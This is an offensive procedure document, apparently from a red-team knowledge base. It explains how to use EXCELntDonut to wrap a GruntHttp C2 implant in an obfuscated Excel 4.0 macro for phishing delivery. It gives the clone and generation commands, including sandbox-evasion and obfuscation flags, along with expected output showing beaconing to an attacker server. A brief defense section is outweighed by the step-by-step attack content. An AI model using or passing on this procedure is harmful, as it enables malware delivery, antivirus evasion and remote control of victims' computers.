---
type: procedure
description: >-
  Generates an Excel 4.0 XLM macro payload using EXCELntDonut to execute a
  GruntHttp .NET implant, evading detection through legacy macro execution.
verified: true
submitted: false
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/User-Execution|T1204 - User Execution]]'
  - '[[techniques/Dynamic-Data-Exchange|T1173 - Dynamic Data Exchange]]'
  - >-
    [[techniques/Obfuscated-Files-or-Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques:
  - '[[techniques/User-Execution-Malicious-File|T1204.002 - Malicious File]]'
  - '[[techniques/Obfuscated-Files-or-Information|T1027.001 - Binary Padding]]'
tags:
  - '[[tags/Office - Attacks]]'
  - '[[tags/XLM Excel 4.0 - EXCELntDonut]]'
  - macro
  - payload-generation
  - dotnet
commands:
  - '[[commands/git-clone-EXCELntDonut-repository]]'
  - '[[commands/excelntdonut-generate-payload]]'
platforms:
  - Windows
tools:
  - '[[tools/EXCELntDonut]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
---

# Generate-XLM-Excel-4.0-GruntHttp-Payload

## Summary

This procedure uses the EXCELntDonut tool to create an Excel 4.0 (XLM) macro payload that executes a GruntHttp .NET assembly on a target Windows system. The payload leverages legacy Excel functionality to load and run shellcode in memory, bypassing modern antivirus and EDR solutions that focus on VBA macros. Ideal for phishing attachments or drive-by downloads targeting Microsoft Office environments.

## Description

EXCELntDonut converts a .NET executable or source code (such as GruntHttp, a HTTP-based C2 implant) into position-independent shellcode using the Donut framework. This shellcode is then embedded into an Excel 4.0 macro using XLM formulas that trigger execution upon file opening. The macro uses functions like REGISTER and EXEC to invoke the shellcode without prompting for macro enablement in many cases. This technique exploits the rarely disabled Excel 4.0 support in modern Office versions, providing defense evasion through obfuscation and in-memory execution. The resulting .xlsx or .xls file can be delivered via email or shared drives, achieving initial code execution and potential persistence or C2 beaconing via GruntHttp.

## Requirements

1. Build machine with Python 3.x installed.
2. .NET Framework 4.0 or later (for compilation if providing C# source; the tool invokes csc.exe automatically).
3. C# source code or pre-compiled EXE/DLL for GruntHttp (e.g., GruntHttp.cs with Main method in Program class).
4. Target system running Microsoft Excel (Office 2010+ on Windows) with Excel 4.0 macros enabled (default in many enterprise setups).
5. Administrative access on build machine to run Python and access .NET tools.

## Defense

- Disable Excel 4.0 macros via Group Policy (File > Options > Trust Center > Macro Settings > disable all macros, or specifically block XLM).
- Deploy EDR solutions that monitor for anomalous Excel processes spawning network connections or injecting code (e.g., via AMSI or ETW logging).
- Educate users to avoid opening unexpected Excel files and enable Protected View for email attachments.
- Monitor for downloads of tools like EXCELntDonut or unusual Python executions on build endpoints.
- Network segmentation to block C2 traffic from GruntHttp (e.g., outbound HTTP to attacker domains).

## Objectives

1. Generate a malicious Excel file containing an XLM macro that executes GruntHttp shellcode.
2. Achieve code execution on target without VBA prompts or AV detection.
3. Establish C2 communication via GruntHttp for further post-exploitation.
4. Demonstrate evasion of endpoint defenses using legacy Office features.

## Instructions

### Step 1: Clone EXCELntDonut Repository

**Context**: Download the EXCELntDonut tool source code to your build machine. This provides the Python scripts needed to generate the payload.

**Command** ([[commands/git-clone-EXCELntDonut-repository]]):
```bash
git clone https://github.com/FortyNorthSecurity/EXCELntDonut
```

> This clones the repository to a local directory (e.g., ./EXCELntDonut). Navigate to it with `cd EXCELntDonut` for subsequent steps. Verify the clone by checking for EXCELntDonut.py in the directory.

### Step 2: Generate XLM Payload for GruntHttp

**Context**: Use EXCELntDonut to compile the GruntHttp C# source (if provided), generate shellcode, and embed it into an XLM macro. Specify the class and method for entry point (typically Program.Main for standard .NET apps). Include references if GruntHttp requires additional assemblies (e.g., System.Management for WMI). The --sandbox flag adds checks to avoid execution in virtualized environments, and --obfuscate randomizes macro elements for evasion.

**Command** ([[commands/excelntdonut-generate-payload]]):
```bash
python EXCELntDonut.py -f $_GRUNTHTTP_CS -c Program -m Main -r "System.Management" -o $_OUTPUT_XLSM --sandbox --obfuscate
```

> Replace $_GRUNTHTTP_CS with the path to your GruntHttp.cs file (e.g., /path/to/GruntHttp.cs). If using a pre-compiled EXE/DLL, use -f /path/to/GruntHttp.exe instead of -c and -m. The tool automatically handles x86/x64 compilation and shellcode generation. Run from the cloned repository directory.

### Step 3: Verify and Prepare Payload

**Context**: Test the generated Excel file in a safe environment to confirm the macro executes without errors. Open the file in Excel; the XLM macro should trigger automatically or via sheet interaction.

**Instructions**: Open $_OUTPUT_XLSM in Microsoft Excel on a test VM. Monitor for GruntHttp beaconing (e.g., HTTP requests to your C2 server). If sandbox checks trigger, the payload exits silently.

**Expected Output**: A functional .xlsm file (~50-200 KB) with hidden XLM sheets containing obfuscated formulas. No visible errors on open; network traffic indicates successful shellcode execution.

## Expected Output

Successful execution produces an Excel file ready for delivery. Sample console output from EXCELntDonut:
```
[+] Compiling C# source to assembly...
[+] Generating x86 shellcode with Donut...
[+] Generating x64 shellcode with Donut...
[+] Obfuscating XLM macro...
[+] Sandbox checks added.
[+] Payload written to output.xlsm
```
On target: Excel process spawns GruntHttp, establishing HTTP C2 (e.g., POST /checkin to attacker server).
